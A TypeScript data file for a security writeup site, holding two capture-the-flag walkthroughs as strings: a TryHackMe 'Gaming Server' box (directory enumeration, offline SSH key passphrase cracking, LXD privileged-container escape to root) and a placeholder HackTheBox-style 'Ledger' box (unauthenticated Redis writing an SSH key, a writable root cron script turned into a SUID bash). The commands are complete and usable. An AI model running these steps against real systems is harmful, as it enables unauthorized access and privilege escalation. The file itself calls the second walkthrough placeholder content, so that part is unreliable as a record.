// "gaming-server" is a real, condensed writeup. Everything else in this
// file is still placeholder content used to design the layout, pending
// conversion from raw notes.

export type MachinePhase = {
  title: string;
  body: string;
};

export type Machine = {
  slug: string;
  name: string;
  platform: "HackTheBox" | "TryHackMe";
  difficulty: "Easy" | "Medium" | "Hard";
  os: "Linux" | "Windows";
  date: string;
  tags: string[];
  summary: string;
  phases: MachinePhase[];
};

export const machines: Machine[] = [
  {
    slug: "gaming-server",
    name: "Gaming Server",
    platform: "TryHackMe",
    difficulty: "Medium",
    os: "Linux",
    date: "2026-01-30",
    tags: [
      "nmap",
      "gobuster",
      "source-disclosure",
      "ssh-key-crack",
      "john",
      "lxd-privesc",
    ],
    summary:
      "A TryHackMe Linux box where a leaked upload-handler source and a passphrase-protected SSH key lead to a foothold, and lxd group membership finishes the job.",
    phases: [
      {
        title: "Recon",
        body: `\`\`\`shell
$ nmap 10.48.153.3
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
\`\`\`

\`\`\`shell
$ nmap -p 22,80 -sV -T4 10.48.153.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
\`\`\`

\`\`\`shell
$ gobuster dir -u http://10.48.153.3 \\
    -w DirBuster-2007_directory-list-lowercase-2.3-small.txt \\
    -x php,html,txt
index.html    (Status: 200)
about.html    (Status: 200)
about.php     (Status: 200)
uploads       (Status: 301)
robots.txt    (Status: 200)
secret        (Status: 301)
myths.html    (Status: 200)
\`\`\`

\`robots.txt\` doesn't hide anything &mdash; it points straight at
\`/uploads/\`:

\`\`\`text
user-agent: *
Allow: /
/uploads/
\`\`\`
`,
      },
      {
        title: "Enumeration",
        body: `The site itself is a fantasy-game landing page with nothing useful in
the nav &mdash; everything interesting is off the beaten path.

![Home page of the target site, a fantasy game landing page called Draagan](/writeups/gaming-server/enum-target-homepage.png)

\`robots.txt\` doesn't hide anything &mdash; it points straight at
\`/uploads/\`:

\`\`\`text
user-agent: *
Allow: /
/uploads/
\`\`\`

![robots.txt served in the browser, listing /uploads/](/writeups/gaming-server/enum-robots-txt.png)

Both \`/uploads/\` and \`/secret/\` have directory listing enabled.

![Directory listing for /uploads/ showing dict.lst, manifesto.txt, and meme.jpg](/writeups/gaming-server/enum-uploads-listing.png)

\`/uploads/\` has \`dict.lst\` (a candidate password list), \`manifesto.txt\`
(nothing useful), and \`meme.jpg\`. The image turned out to be a
\`steghide\`-protected red herring &mdash; \`stegseek\` against it with
\`dict.lst\` came up empty:

![stegseek --crack against meme.jpg failing to find a valid passphrase](/writeups/gaming-server/enum-stegseek-fail.png)

![Directory listing for /secret/ showing a single file, secretKey](/writeups/gaming-server/enum-secret-listing.png)

\`/secret/\` has a single file, \`secretKey\`, which turns out to be a
passphrase-protected RSA private key:

\`\`\`shell
$ wget http://10.48.153.3/secret/secretKey
$ cat secretKey
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
...
-----END RSA PRIVATE KEY-----
\`\`\`

Viewing the homepage source turns up a username in an HTML comment:

![HTML source comment addressed to john about placeholder content](/writeups/gaming-server/enum-html-comment-username.png)

\`\`\`html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
\`\`\`

\`about.php\` renders the same page as \`about.html\` but adds a file
upload form:

![about.php page rendered in the browser with a file upload form](/writeups/gaming-server/enum-about-php-upload-form.png)

Intercepting a request to it in Burp caught one response that leaked
the handler's raw PHP source instead of executing it:

![Burp Suite response tab showing the leaked PHP source of the upload handler](/writeups/gaming-server/enum-burp-leaked-source.png)

\`\`\`php
<?php
  if(isset($_FILES['image'])){
    $errors = array();
    $file_name = $_FILES['image']['name'];
    ...
    $file_ext = strtolower(end(explode('.',$FILES['image']['name'])));

    $expensions = array('jpeg', 'jpg', 'png', 'php');

    if(in_array($file_ext,$expensions)=== false){
      $errors[] = "extension not allowed, please choose a different file type.";
    }

    if(empty($errors) == true){
      move_uploaded_file($file_tmp,"uploads/".$filename);
      echo "Success";
    }else{
      print_r($errors);
    }
  }
?>
\`\`\`

Two bugs in six lines: the extension check reads \`$FILES\` instead of
\`$_FILES\` (so \`$file_ext\` is always empty), and the move step writes
\`$filename\` &mdash; a variable that's never defined &mdash; instead of
\`$file_name\`. \`.php\` is technically in the whitelist, but the upload
can never actually land. Confirmed by trying: a PHP reverse shell
uploads with no error, and never shows up under \`/uploads/\`.`,
      },
      {
        title: "Foothold",
        body: `A first attempt at \`john\` over SSH just asks for a password that
neither wordlist nor the raw key can satisfy:

![SSH prompting for john's password with the host key not yet trusted](/writeups/gaming-server/foothold-ssh-password-prompt.png)

With the upload path dead, \`john\` plus the leaked \`dict.lst\` is the
way in &mdash; but not against SSH directly:

\`\`\`shell
$ hydra -l john -P dict.lst 10.48.153.3 ssh -t 4
1 of 1 target completed, 0 valid password found
\`\`\`

Trying \`secretKey\` as the identity file just moves the same problem to
its passphrase:

![SSH repeatedly rejecting the passphrase for secretKey](/writeups/gaming-server/foothold-ssh-key-passphrase-fail.png)

The private key's passphrase is a better target for the same wordlist,
cracked offline instead of over the wire:

\`\`\`shell
$ ssh2john secretKey > keysecret.txt
$ john -w dict.lst keysecret.txt --format=ssh
letmein          (secretKey)
\`\`\`

![john cracking secretKey's passphrase as "letmein"](/writeups/gaming-server/foothold-john-crack-passphrase.png)

\`\`\`shell
$ chmod 600 secretKey
$ ssh -i secretKey john@10.48.153.3
Enter passphrase for key 'secretKey': letmein
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
\`\`\`

![Logged in over SSH as john, dropped to a shell prompt](/writeups/gaming-server/foothold-ssh-login-success.png)

![whoami confirming the shell belongs to john](/writeups/gaming-server/foothold-whoami-john.png)`,
      },
      {
        title: "Privilege escalation",
        body: `\`john\` is in the \`sudo\` group, but only \`sudo\` with the account's
actual login password works &mdash; which isn't known, only the SSH key
is:

\`\`\`shell
$ sudo -l
[sudo] password for john:
Sorry, try again.
\`\`\`

![sudo -l and sudo -i both rejecting john's unknown password](/writeups/gaming-server/privesc-sudo-fail.png)

The more interesting group from \`id\` is \`lxd\`:

![id showing john's group membership, including lxd](/writeups/gaming-server/privesc-id-lxd-group.png)

\`linpeas\` flags it directly, and it's a well-known container-escape
path documented on GTFOBins:

![linpeas highlighting john's sudo and lxd group membership](/writeups/gaming-server/privesc-linpeas-lxd.png)

![GTFOBins' lxd entry showing the image-build-and-mount escape](/writeups/gaming-server/privesc-gtfobins-lxd.png)

Since no base image is present on the box yet, build one locally with
[lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder) and
serve it over HTTP:

\`\`\`shell
$ git clone https://github.com/saghul/lxd-alpine-builder
$ cd lxd-alpine-builder
$ sudo ./build-alpine -a i686
$ python3 -m http.server 8000
\`\`\`

![Cloning lxd-alpine-builder on the attacker box](/writeups/gaming-server/privesc-alpine-builder-clone.png)

![The built Alpine image tarball ready to serve](/writeups/gaming-server/privesc-alpine-image-built.png)

Pull it onto the target:

![wget pulling the Alpine image tarball onto the target](/writeups/gaming-server/privesc-image-transferred.png)

...import it, and launch a privileged container with the host
filesystem mounted in:

\`\`\`shell
john@exploitable:~$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
john@exploitable:~$ lxc init myimage ignite -c security.privileged=true
john@exploitable:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
john@exploitable:~$ lxc start ignite
john@exploitable:~$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
\`\`\`

![Root shell inside the privileged LXD container](/writeups/gaming-server/privesc-root-shell.png)

The container's own \`/root\` is just the fresh Alpine image's empty
home directory &mdash; **the real host filesystem is mounted at**
\`/mnt/root\` because of the device added above, so that's where the
loot actually lives:

![Navigating from the container's /root to the mounted host filesystem under /mnt](/writeups/gaming-server/privesc-searching-for-flag.png)

![root.txt located under /mnt/root, the mounted host filesystem](/writeups/gaming-server/privesc-root-flag-location.png)
`,
      },
    ],
  },
  {
    slug: "ledger",
    name: "Ledger",
    platform: "HackTheBox",
    difficulty: "Easy",
    os: "Linux",
    date: "2026-03-02",
    tags: ["redis", "ssh-keys", "cron"],
    summary:
      "An easy Linux box with an unauthenticated Redis instance that's abused to plant an SSH key, then a root cron job that finishes the job. Placeholder writeup used to design this section's layout.",
    phases: [
      {
        title: "Recon",
        body: `\`\`\`shell
$ nmap -p- -T4 10.10.71.9
PORT     STATE SERVICE
22/tcp   open  ssh
6379/tcp open  redis
\`\`\`

Redis with no auth configured:

\`\`\`shell
$ redis-cli -h 10.10.71.9 ping
PONG
$ redis-cli -h 10.10.71.9 config get requirepass
1) "requirepass"
2) ""
\`\`\`

An open, unauthenticated Redis instance is enough on its own &mdash; the
next step is turning read/write access into code execution.`,
      },
      {
        title: "Foothold",
        body: `Redis can write arbitrary files, so the standard move is to write an
SSH public key into a user's \`authorized_keys\`:

\`\`\`shell
$ (echo -e "\\n\\n"; cat id_rsa.pub; echo -e "\\n\\n") > key.txt
$ redis-cli -h 10.10.71.9 flushall
$ cat key.txt | redis-cli -h 10.10.71.9 -x set ssh_key
$ redis-cli -h 10.10.71.9 config set dir /home/ledger/.ssh
$ redis-cli -h 10.10.71.9 config set dbfilename authorized_keys
$ redis-cli -h 10.10.71.9 save
\`\`\`

\`\`\`shell
$ ssh -i id_rsa ledger@10.10.71.9
ledger@ledger:~$ id
uid=1000(ledger) gid=1000(ledger) groups=1000(ledger)
\`\`\`

Grab the user flag from \`/home/ledger/user.txt\`.`,
      },
      {
        title: "Privilege escalation",
        body: `\`/etc/crontab\` is world-readable and shows a root cron job running a
script the \`ledger\` user can write to:

\`\`\`shell
$ cat /etc/crontab
* * * * * root /opt/ledger/sync.sh
$ ls -la /opt/ledger/sync.sh
-rwxrwxr-x 1 root ledger /opt/ledger/sync.sh
\`\`\`

Append a reverse shell (or SUID bash copy) to the script and wait for the
next minute's run:

\`\`\`shell
$ echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/ledger/sync.sh
$ sleep 60 && /tmp/rootbash -p
rootbash-5.1# whoami
root
\`\`\`
`,
      },
      {
        title: "Loot",
        body: `**User flag:** \`HTB{placeholder_user_flag_ledger}\`

**Root flag:** \`HTB{placeholder_root_flag_ledger}\`
`,
      },
    ],
  },
];

export function getMachine(slug: string): Machine | undefined {
  return machines.find((m) => m.slug === slug);
}

export function machinesByPlatform(platform: Machine["platform"]): Machine[] {
  return machines.filter((m) => m.platform === platform);
}

// URL segment for each platform, e.g. /writeups/tryhackme, /writeups/hackthebox
export const PLATFORM_ROUTES = {
  TryHackMe: "tryhackme",
  HackTheBox: "hackthebox",
} as const;

export function platformSlug(platform: Machine["platform"]): string {
  return PLATFORM_ROUTES[platform];
}
